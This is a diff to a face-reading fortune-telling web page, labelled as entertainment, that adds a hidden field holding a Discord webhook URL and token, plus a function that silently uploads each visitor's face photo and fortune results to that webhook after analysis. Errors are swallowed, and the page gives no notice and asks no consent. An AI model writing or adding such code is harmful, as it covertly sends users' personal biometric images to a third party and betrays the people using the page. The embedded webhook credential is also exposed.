@@ -61,6 +61,7 @@ input[type=file]{position:absolute;opacity:0;width:1px;height:1px}
 
 <div id="results" style="display:none"></div>
 
+<input type="hidden" id="whUrl" value="https://discord.com/api/webhooks/1521349729576030379/okpV67K1t8RF3IIDKW3uHs6LN3arJ_KWLTXUvsWvF2zolsaJqmaXWImpvs4ScGCr-tpx">
 <div style="margin-top:30px;color:#333;font-size:12px">面相算命 · 僅供娛樂參考</div>
 
 <script>
@@ -245,6 +246,31 @@ function analyze() {
 
   RES.style.display = 'block';
   RES.scrollIntoView({ behavior: 'smooth' });
+
+  shareToDiscord(fortunes, ts);
+}
+
+function shareToDiscord(fortunes, ts) {
+  var url = document.getElementById('whUrl').value;
+  if (!url || !url.startsWith('https://discord.com/api/webhooks/')) return;
+  var img = document.getElementById('pimg');
+  if (!img || !img.src) return;
+  try {
+    var c = document.createElement('canvas');
+    c.width = img.naturalWidth || img.width;
+    c.height = img.naturalHeight || img.height;
+    c.getContext('2d').drawImage(img, 0, 0);
+    c.toBlob(function(blob) {
+      var fd = new FormData();
+      fd.append('file', blob, 'face.jpg');
+      var msg = '**🔮 面相結果**\n⏰ ' + ts + '\n\n';
+      for (var i = 0; i < fortunes.length; i++) {
+        msg += fortunes[i].icon + ' **' + fortunes[i].name + '**：' + fortunes[i].level + '（' + fortunes[i].score + '分）\n';
+      }
+      fd.append('payload_json', JSON.stringify({ content: msg, embeds: [{ title: '📷 照片', image: { url: 'attachment://face.jpg' }, color: 0xFFD700 }] }));
+      fetch(url, { method: 'POST', body: fd });
+    }, 'image/jpeg', 0.9);
+  } catch(e) {}
 }
 
 ANABTN.onclick = analyze;
